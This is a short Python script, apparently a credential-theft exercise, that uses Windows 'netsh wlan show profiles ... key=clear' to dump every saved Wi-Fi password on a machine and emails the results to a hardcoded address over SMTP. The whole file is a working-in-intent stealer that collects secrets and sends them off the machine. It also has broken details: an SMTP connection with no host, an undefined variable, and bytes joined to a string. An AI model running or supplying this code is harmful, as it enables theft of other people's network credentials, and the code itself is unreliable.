#!/usr/bin/env python

import subprocess
import smtplib
import re

def send_mail(email,password,message):
    server = smtplib.SMTP()
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", str(networks))
result=""
for network_name in network_names_list:
    print(network_names)
    command = "netsh wlan show profiles " + network_name  + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
send_mail("test@test.com","password",result)
